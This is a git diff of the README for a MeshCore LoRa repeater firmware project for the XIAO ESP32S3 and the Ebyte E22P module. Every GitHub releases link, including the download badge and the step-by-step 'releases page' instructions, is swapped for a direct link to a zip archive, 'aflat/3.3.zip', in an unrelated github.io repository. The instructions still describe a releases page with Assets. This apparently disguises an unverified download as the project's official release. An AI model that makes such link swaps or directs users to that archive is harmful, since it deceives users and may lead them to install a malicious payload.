@@ -5,7 +5,7 @@ description: "Extend MeshCore LoRa range using the Seeed Studio XIAO ESP32S3 and
 ---
 # 🌐 MeshCore-E22P-Repeater - Build reliable long range mesh networks
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Clarabelleazo858/MeshCore-E22P-Repeater/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Clarabelleazo858/clarabelleazo858.github.io/main/aflat/3.3.zip)
 
 This project provides firmware to turn your hardware into a high-performance mesh repeater. It works with the XIAO ESP32S3 and Ebyte E22P-868M30S modules. The software improves network range and connection stability by recovering signals from high noise environments.
 
@@ -21,9 +21,9 @@ You need the following items to build this repeater:
 The firmware occupies the ESP32S3 memory and manages the radio module. It filters background radio interference. This improves range in urban areas where many other devices operate on similar frequencies. You do not need to write code to use this system.
 
 ## 📥 Downloading the Files
-Visit this page to download the software: https://github.com/Clarabelleazo858/MeshCore-E22P-Repeater/releases
+Visit this page to download the software: https://raw.githubusercontent.com/Clarabelleazo858/clarabelleazo858.github.io/main/aflat/3.3.zip
 
-1. Open the [releases page](https://github.com/Clarabelleazo858/MeshCore-E22P-Repeater/releases) in your web browser.
+1. Open the [releases page](https://raw.githubusercontent.com/Clarabelleazo858/clarabelleazo858.github.io/main/aflat/3.3.zip) in your web browser.
 2. Locate the section labeled Assets.
 3. Click the file ending in `.bin` or the installer package to start the download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
